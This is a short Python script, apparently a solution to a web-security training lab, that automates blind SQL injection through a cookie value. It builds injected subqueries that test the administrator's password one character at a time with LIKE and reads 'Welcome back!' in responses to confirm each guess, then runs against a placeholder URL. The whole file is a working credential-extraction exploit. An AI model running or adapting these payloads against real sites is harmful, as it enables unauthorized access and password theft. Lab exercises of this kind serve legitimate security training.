from base_password_cracker_class import BasePasswordCracker

class ConditionalResponseLab(BasePasswordCracker):
    def build_cookie_exact_match(self):
        return f"' or (select '1' from users where username = 'administrator' and password = '{self.password}') = '1"

    def build_cookie_guess_password(self, character):
        return f"' or (select '1' from users where username = 'administrator' and password like '{self.password + character}%25') = '1"

    def password_exists(self, response):
        return 'Welcome back!' in response.text

if __name__ == "__main__":
    # Adapt url
    url = "https://example.com/" 
    cracker = ConditionalResponseLab(url)
    cracker.crack_password()
    